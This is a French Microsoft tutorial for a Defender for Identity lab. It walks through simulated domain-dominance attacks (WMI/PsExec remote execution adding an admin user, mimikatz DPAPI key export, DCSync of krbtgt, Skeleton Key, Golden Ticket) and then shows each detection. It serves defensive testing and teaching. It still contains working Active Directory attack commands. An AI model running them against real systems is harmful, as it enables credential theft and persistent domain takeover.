---
title: Playbook du contrôle de domaine Microsoft Defender pour Identity
description: Le playbook du contrôle de domaine Microsoft Defender pour Identity explique comment simuler des attaques de contrôle de domaine à des fins de détection par Defender pour Identity.
keywords: ''
author: shsagir
ms.author: shsagir
manager: shsagir
ms.date: 10/26/2020
ms.topic: tutorial
ms.collection: M365-security-compliance
ms.service: azure-advanced-threat-protection
ms.reviewer: itargoet
ms.suite: ems
ms.openlocfilehash: bf1a3207fe44bee729d1120f71e1038e11e3e853
ms.sourcegitcommit: e2227c0b0e5aaa5163dc56d4131ca82f8dca8fb0
ms.translationtype: HT
ms.contentlocale: fr-FR
ms.lasthandoff: 11/18/2020
ms.locfileid: "94847307"
---
# <a name="tutorial-domain-dominance-playbook"></a>Tutoriel : Playbook de contrôle du domaine

Le dernier tutoriel de cette série en quatre parties sur les alertes de sécurité [!INCLUDE [Product long](includes/product-long.md)] est un playbook sur le contrôle de domaine. L’objectif du labo des alertes de sécurité [!INCLUDE [Product short](includes/product-short.md)] est d’illustrer les fonctionnalités de **[!INCLUDE [Product short](includes/product-short.md)]** concernant l’identification et la détection des attaques potentielles du réseau. Il explique comment tester certaines détections *discrètes* de [!INCLUDE [Product short](includes/product-short.md)] à l’aide de ses fonctionnalités liées à la *signature*. Les tutoriels ne comprennent ni les alertes et détections avancées de type Machine Learning, ni les alertes et détections comportementales des utilisateurs et des entités de [!INCLUDE [Product short](includes/product-short.md)]. Ces types de détections et d’alertes ne sont pas inclus dans le test, car ils nécessitent une période d’apprentissage et un trafic réseau réel pouvant aller jusqu’à 30 jours. Pour plus d’informations sur les différents tutoriels de cette série, consultez la [vue d’ensemble des labos des alertes de sécurité [!INCLUDE [Product short](includes/product-short.md)]](playbook-lab-overview.md).

Ce playbook montre certaines détections de menaces de type contrôle de domaine et certains services d’alertes de sécurité [!INCLUDE [Product short](includes/product-short.md)] à l’aide d’attaques simulées avec des outils de piratage et d’attaque courants, réels et accessibles au public. Les méthodes concernées sont généralement utilisées à ce stade de la chaîne de destruction de cyberattaque pour obtenir le contrôle persistant du domaine.

Dans ce tutoriel, vous allez simuler des tentatives de prise de contrôle persistante du domaine afin de passer en revue chacune des détections de [!INCLUDE [Product short](includes/product-short.md)] pour les méthodes courantes suivantes :

> [!div class="checklist"]
>
> - Exécution de code à distance
> - API de protection des données (DPAPI)
> - Réplication malveillante
> - Création de service
> - Skeleton Key
> - Golden Ticket

## <a name="prerequisites"></a>Prérequis

1. [Un labo des alertes de sécurité [!INCLUDE [Product short](includes/product-short.md)] terminé](playbook-setup-lab.md)
     - Nous vous recommandons de suivre d’aussi près que possible les instructions de configuration du labo. Plus votre labo sera proche de la configuration suggérée, plus les procédures de test [!INCLUDE [Product short](includes/product-short.md)] seront faciles à suivre.

2. [Dernière étape du didacticiel du playbook de mouvement latéral](playbook-lateral-movement.md)

## <a name="domain-dominance"></a>Contrôle du domaine

Dans la chaîne de destruction de cyberattaque, pendant la phase de contrôle du domaine, un attaquant a déjà obtenu des informations d’identification légitimes pour accéder à votre contrôleur de domaine. Le fait qu’un attaquant ait accès à votre contrôleur de domaine signifie que tous les niveaux de votre réseau peuvent subir des dommages. Outre les dommages immédiats, les attaquants, en particulier les plus sophistiqués, aiment placer des *stratégies d’assurance* supplémentaires dans les environnements qu’ils ont compromis. Lors de telles attaques, même si la mise en danger et les actions initiales de l’attaquant sont découvertes, ce dernier a toujours d’autres possibilités de rester dans votre domaine, ce qui augmente ses chances de réussite à long terme.

### <a name="remote-code-execution"></a>Exécution de code à distance

L’exécution de code à distance porte bien son nom. Des attaquants se donnent les moyens d’exécuter du code à distance sur une ressource, dans notre cas un contrôleur de domaine. Nous allons essayer d’utiliser conjointement ces outils courants pour exécuter du code à distance et prendre le contrôle permanent du contrôleur de domaine, puis voir ce que nous montre [!INCLUDE [Product short](includes/product-short.md)].

- Windows Management Instrumentation (WMI)
- PsExec à partir de SysInternals

À l’aide de WMI via la ligne de commande, essayez de créer localement un processus sur le contrôleur de domaine pour créer un utilisateur nommé « InsertedUser » avec le mot de passe : pa$ $w0rd1.

1. Ouvrez la ligne de commande en cours d’exécution dans le contexte de *SamiraA* à partir de **VictimPC** et exécutez la commande suivante :

   ```dos
   wmic /node:ContosoDC process call create "net user /add InsertedUser pa$$w0rd1"
   ```

1. L’utilisateur étant maintenant créé, ajoutez-le au groupe « Administrateurs » sur le contrôleur de domaine :

   ```dos
   PsExec.exe \\ContosoDC -accepteula net localgroup "Administrators" InsertedUser /add
   ```

    ![Utilisez l’exécution de code à distance (PsExec) pour ajouter le nouvel utilisateur au groupe des administrateurs sur le contrôleur de domaine](media/playbook-dominance-psexec_addtoadmins.png)

1. Accédez à **Utilisateurs et ordinateurs Active Directory (ADUC)** sur **ContosoDC** et recherchez **InsertedUser**.

1. Cliquez avec le bouton droit sur **Propriétés** et vérifiez l’appartenance.

    ![Afficher les propriétés d'« InsertedUser »](media/playbook-dominance-inserteduser_properties.png)

En agissant comme un attaquant, vous avez pu créer un nouvel utilisateur dans votre labo à l’aide de WMI. Vous avez également ajouté le nouvel utilisateur au groupe Administrateurs à l’aide de PsExec. Du point de vue de la persistance, d’autres informations d’identification légitimes indépendantes ont été créées sur le contrôleur de domaine. De nouvelles informations d’identification permettent à un attaquant d’avoir accès en permanence au contrôleur de domaine si l’accès précédemment obtenu avec des informations d'identification a été découvert et supprimé.

### <a name="remote-code-execution-detection-in-product-short"></a>Détection d’exécution de code à distance dans [!INCLUDE [Product short](includes/product-short.md)]

Connectez-vous au portail [!INCLUDE [Product short](includes/product-short.md)] pour voir si [!INCLUDE [Product short](includes/product-short.md)] a détecté quelque chose à la suite de notre dernière attaque simulée :

![Détection d’exécution de code à distance WMI par [!INCLUDE [Product short](includes/product-short.md)]](media/playbook-dominance-wmipsexecdetected.png)

[!INCLUDE [Product short](includes/product-short.md)] a détecté les exécutions de code à distance de WMI et de PsExec.

En raison du chiffrement de la session WMI, certaines valeurs telles que les méthodes WMI réelles ou le résultat de l’attaque ne sont pas visibles. Toutefois, la détection de ces actions par [!INCLUDE [Product short](includes/product-short.md)] nous fournit des informations idéales pour prendre des mesures défensives.

VictimPC, l’ordinateur, ne doit jamais exécuter de code à distance sur les contrôleurs de domaine.

Au fur et à mesure que [!INCLUDE [Product short](includes/product-short.md)] apprend qui est inséré dans quels groupes de sécurité, des activités suspectes similaires sont identifiées comme étant anormales dans la chronologie. Dans la mesure où ce labo a été créé récemment et est toujours en période d’apprentissage, cette activité ne s’affichera pas en tant qu’alerte. La détection des modifications des groupes de sécurité par [!INCLUDE [Product short](includes/product-short.md)] peut être validée en vérifiant la chronologie des activités. [!INCLUDE [Product short](includes/product-short.md)] offre également la possibilité de créer des rapports sur toutes les modifications des groupes de sécurité. Ils peuvent vous être envoyés par e-mail de manière proactive.

Accédez à la page **Administrateur** sur le portail [!INCLUDE [Product short](includes/product-short.md)] à l’aide de l’outil Recherche. La détection d’insertion d’utilisateurs par [!INCLUDE [Product short](includes/product-short.md)] s’affiche dans la chronologie des activités du groupe Administrateurs.

![L’affichage a ajouté un utilisateur au groupe de sécurité sensible](media/playbook-dominance-admininserteduser.png)

### <a name="data-protection-api-dpapi"></a>API de protection des données (DPAPI)

L’API de protection des données (DPAPI) est utilisée par Windows pour protéger en toute sécurité les mots de passe enregistrés par les navigateurs et les fichiers chiffrés, ainsi que les autres données sensibles. Les contrôleurs de domaine détiennent une clé principale qui peut déchiffrer *tous* les secrets sur des machines Windows jointes au domaine.

À l’aide de **mimikatz**, nous allons tenter d’exporter la clé principale à partir du contrôleur de domaine.

1. Exécutez la commande suivante sur le contrôleur de domaine :

   ```dos
   mimikatz.exe "privilege::debug" "lsadump::backupkeys /system:ContosoDC.contoso.azure /export" "exit"
   ```

    ![Utilisation de mimikatz pour exporter la clé de sauvegarde DPAPI à partir d’Active Directory](media/playbook-dominance-dpapi_mimikatz.png)

1. Vérifiez que le fichier de clé principale a bien été exporté. Recherchez dans le répertoire à partir duquel vous avez exécuté mimikatz.exe pour afficher les fichiers .der, .pfx, .pvk et .key créés. Copiez la clé héritée à partir de l’invite de commandes.

En tant qu’attaquants, nous disposons maintenant de la clé qui nous permettra de déchiffrer les fichiers chiffrés par DPAPI/les données sensibles à partir de *n’importe quelle* machine dans toute la forêt.

### <a name="dpapi-detection-in-product-short"></a>Détection d’attaques DPAPI dans [!INCLUDE [Product short](includes/product-short.md)]

Vérifions sur le portail [!INCLUDE [Product short](includes/product-short.md)] que [!INCLUDE [Product short](includes/product-short.md)] a réussi à détecter notre attaque DPAPI :

![Détection de demande DPAPI par [!INCLUDE [Product short](includes/product-short.md)]](media/playbook-dominance-dpapidetected.png)

### <a name="malicious-replication"></a>Réplication malveillante

La réplication malveillante permet à un attaquant de répliquer les informations de l’utilisateur à l’aide des informations d'identification de l’administrateur de domaine (ou d’un équivalent). La réplication malveillante permet essentiellement à un attaquant de collecter à distance des informations d’identification. Le compte le plus critique en termes de tentatives de collecte est apparemment « krbtgt », car il s’agit de la clé principale utilisée pour signer tous les tickets Kerberos.

Il existe deux ensembles d’outils de piratage courants qui permettent aux attaquants de tenter une réplication malveillante : **mimikatz** et **Impacket** de Core Security.

#### <a name="mimikatz-lsadumpdcsync"></a>Mimikatz lsadump::dcsync

À partir de **VictimPC**, dans le contexte de **SamirA**, exécutez la commande Mimikatz suivante :

```dos
mimikatz.exe "lsadump::dcsync /domain:contoso.azure /user:krbtgt" "exit" >> c:\temp\ContosoDC_krbtgt-export.txt
```

Nous avons répliqué les informations du compte « krbtgt » dans `c:\\temp\\ContosoDC_krbtgt-export.txt`.

![Réplication malveillante via mimikatz](media/playbook-dominance-maliciousrep_mimikatz.png)

#### <a name="malicious-replication-detection-in-product-short"></a>Détection de réplication malveillante dans [!INCLUDE [Product short](includes/product-short.md)]

Sur le portail [!INCLUDE [Product short](includes/product-short.md)], vérifiez que le Centre d’opérations de sécurité est au courant de la réplication malveillante que nous avons simulée à partir de VictimPC.

![Détection de réplication malveillante par [!INCLUDE [Product short](includes/product-short.md)]](media/playbook-dominance-maliciousrep_detected.png)

### <a name="skeleton-key"></a>Skeleton Key

Une autre méthode de contrôle de domaine utilisée par les attaquants est connue sous le nom de **Skeleton Key**. À l’aide d’un Skeleton Key créé par l’attaquant, l’attaquant peut usurper l’identité de *n’importe quel utilisateur* à *tout moment*. Lors d’une attaque Skeleton Key, chaque utilisateur peut toujours se connecter avec son mot de passe normal, mais chacun de ses comptes est également doté d’un mot de passe principal. Le nouveau mot de passe principal ou Skeleton Key donne accès au compte à toute personne qui le connaît. Une attaque Skeleton Key est effectuée par le biais d’une mise à jour corrective du processus LSASS.exe sur le contrôleur de domaine, ce qui oblige les utilisateurs à s’authentifier via un type de chiffrement d’une version antérieure.

Utilisons un Skeleton Key pour voir comment fonctionne ce type d’attaque :

1. Déplacez **mimikatz** vers **ContosoDC** à l’aide des informations d'identification de **SamirA** collectées préalablement. Veillez à transmettre l’architecture appropriée de **mimikatz.exe** selon le type d’architecture du contrôleur de domaine (64 bits ou 32 bits). À partir du dossier **mimikatz**, exécutez :

   ```dos
   xcopy mimikatz.exe \\ContosoDC\c$\temp
   ```

1. Une fois **mimikatz** transféré sur le contrôleur de domaine, l’exécuter à distance par le biais de PsExec :

   ```dos
   PsExec.exe \\ContosoDC -accepteula cmd /c (cd c:\temp ^& mimikatz.exe "privilege::debug" "misc::skeleton" ^& "exit")
   ```

1. Vous avez réussi à corriger le processus LSASS sur **ContosoDC**.

    ![Attaque Skeleton Key par le biais de mimikatz](media/playbook-dominance-skeletonkey.png)

### <a name="exploiting-the-skeleton-key-patched-lsass"></a>Exploitation du Skeleton Key corrigé LSASS

Sur **VictimPC**, ouvrez une invite de commande (dans le contexte de **JeffL**), exécutez la commande suivante pour tenter de devenir le contexte de RonHD.

```dos
runas /user:ronhd@contoso.azure "notepad"
```

Lorsque vous y êtes invité, utilisez le mot de passe incorrect exprès. Cette action prouve que le compte a *toujours* un mot de passe après l’exécution de l’attaque.

![Utilisation d’un mot de passe *incorrect* après une attaque Skeleton Key (cette méthode fonctionne exactement comme indiqué)](media/playbook-dominance-skeletonkey_wrong.png)

Mais Skeleton Key ajoute un mot de passe supplémentaire à chaque compte. Effectuez à nouveau la commande « runas », mais cette fois utilisez « mimikatz » comme mot de passe.

```dos
runas /user:ronhd@contoso.azure "notepad"
```

Cette commande crée un nouveau processus, *le bloc-notes*, qui s’exécute dans le contexte de RonHD. **Skeleton Key peut être effectué pour _n’importe quel_ compte, notamment les comptes de services et les comptes d’ordinateurs.**

> [!Important]
> Il est important de redémarrer ContosoDC après avoir exécuté l’attaque Skeleton Key. Sinon, le processus LSASS.exe sur ContosoDC sera corrigé et modifié, entraînant la rétrogradation de chaque demande d’authentification à RC4.

### <a name="skeleton-key-attack-detection-in-product-short"></a>Détection d’attaque Skeleton Key dans [!INCLUDE [Product short](includes/product-short.md)]

Quels sont les événements détectés et signalés par [!INCLUDE [Product short](includes/product-short.md)] ?

![Détection d’attaque Skeleton Key par [!INCLUDE [Product short](includes/product-short.md)]](media/playbook-dominance-skeletonkey_detected.png)

[!INCLUDE [Product short](includes/product-short.md)] a réussi à détecter la méthode suspecte de chiffrement de l’authentification préalable utilisée pour cet utilisateur.

### <a name="golden-ticket---existing-user"></a>Golden ticket – utilisateur existant

Après avoir volé le « golden ticket » (compte « krbtgt ») [par réplication malveillante](#malicious-replication), un attaquant est en mesure de signer des tickets *comme s’il était le contrôleur de domaine*. **Mimikatz**, le SID de domaine et le compte « krbtgt » volé sont tous nécessaires pour accomplir cette attaque. Non seulement nous pouvons générer des tickets pour un utilisateur, mais encore nous pouvons générer des tickets pour des utilisateurs qui n’existent même pas.

1. En tant que JeffL, exécutez la commande sur ci-dessous sur **VictimPC** pour acquérir le SID du domaine :

   ```dos
   whoami /user
   ```

    ![SID pour utilisateur de golden ticket](media/playbook-dominance-golden_whoamisid.png)

1. Identifiez et copier le SID de domaine mis en surbrillance dans la capture d’écran ci-dessus.

1. À l’aide de **mimikatz**, prenez le SID de domaine copié ainsi que le code de hachage NTLM de l’utilisateur « krbtgt » volé pour générer le TGT. Insérez le texte suivant dans un cmd.exe comme JeffL :

   ```dos
   mimikatz.exe "privilege::debug" "kerberos::golden /domain:contoso.azure /sid:S-1-5-21-2839646386-741382897-445212193 /krbtgt:c96537e5dca507ee7cfdede66d33103e /user:SamiraA /ticket:c:\temp\GTSamiraA_2018-11-28.kirbi /ptt" "exit"
   ```

    ![Créer le Golden Ticket](media/playbook-dominance-golden_generate.png)

   La partie `/ptt` de la commande nous a permis de passer immédiatement le ticket généré en mémoire.

1. Assurons-nous que les informations d’identification sont en mémoire.  Exécutez `klist` dans la console.

    ![résultats klist après la transmission du ticket généré](media/playbook-dominance-golden_klist.png)

1. En tant qu’attaquant, exécutez la commande pass-the-ticket suivante à utiliser sur le contrôleur de domaine :

   ```dos
   dir \\ContosoDC\c$
   ```

   Opération réussie. Vous avez généré un **faux** golden ticket pour SamiraA.

    ![Exécutez golden ticket via mimikatz](media/playbook-dominance-golden_ptt.png)

Pourquoi cela a-t-il fonctionné ? L’attaque golden ticket fonctionne, car le ticket généré était correctement signé avec la clé « KRBTGT » que nous avons récoltée précédemment. Ce ticket nous permet, en tant qu’attaquant, d’accéder à ContosoDC et de nous ajouter à n’importe quel groupe de sécurité que nous souhaitons utiliser.

#### <a name="golden-ticket--existing-user-attack-detection"></a>Golden ticket – détection d’une attaque utilisateur existante

[!INCLUDE [Product short](includes/product-short.md)] utilise plusieurs techniques pour détecter des attaques présumées de ce type. Dans ce scénario précis, il a détecté le passage à une version antérieure de chiffrement du faux ticket.

![Détection du golden ticket](media/playbook-dominance-golden_detected.png)

> [!Important]
>Rappel. Tant que le KRBTGT récolté par un attaquant reste valide dans un environnement, les tickets générés avec lui le restent également. Dans ce cas, l’attaquant réussit à avoir le contrôle persistant du domaine jusqu’à ce que le [KRBTGT soit réinitialisé à deux reprises](/windows-server/identity/ad-ds/manage/ad-forest-recovery-resetting-the-krbtgt-password).

## <a name="next-steps"></a>Étapes suivantes

- [Guide des alertes de sécurité [!INCLUDE [Product short](includes/product-short.md)]](suspicious-activity-guide.md)
- [Examen des chemins de mouvement latéral avec [!INCLUDE [Product short](includes/product-short.md)]](use-case-lateral-movement-path.md)
- [Consulter le forum [!INCLUDE [Product short](includes/product-short.md)]](https://aka.ms/MDIcommunity)

## <a name="join-the-community"></a>Rejoindre la communauté

Vous avez d’autres questions ou vous voulez discuter de [!INCLUDE [Product short](includes/product-short.md)] et de la sécurité associée avec d’autres utilisateurs ? Rejoignez la [Communauté [!INCLUDE [Product short](includes/product-short.md)]](https://techcommunity.microsoft.com/t5/Azure-Advanced-Threat-Protection/bd-p/AzureAdvancedThreatProtection) !
